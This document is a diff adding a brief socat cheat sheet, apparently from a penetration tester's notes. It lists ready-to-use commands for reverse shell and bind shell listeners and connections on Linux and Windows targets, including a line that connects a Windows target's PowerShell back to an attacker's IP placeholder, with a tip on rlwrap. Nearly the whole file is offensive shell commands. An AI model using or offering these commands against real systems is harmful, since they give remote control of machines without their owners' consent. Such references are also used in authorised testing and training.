@@ -1,0 +1,24 @@
+Socat - Connector between two points
+
+Reverse Shell Listener:
+  socat TCP-L:<PORT> -
+              Basic reverse shell listener
+              (takes listening port, and standard input and connects them together)
+
+Bind Shell Listener:
+  socat TCP-L:<PORT> EXEC:"bash -li"
+              Bind shell listener on a Linux target
+  socat TCP-L:<PORT> EXEC:powershell.exe,pipes
+              Bind shell listener on a Windows target
+
+
+Reverse Shell Connection:
+  socat TCP:<LOCAL_IP>:<LOCAL_PORT> EXEC:powershell.exe,pipes
+              Connection back to the reverse shell listener on a Windows target
+
+Bind Shell Connection:
+  socat TCP:<TARGET_IP>:<TARGET_PORT> -
+              Connection to the bind shell listener on a Linux/Attacker target
+
+Informational:
+  rlwrap (technique is especially usefull when dealing with Windows shells)
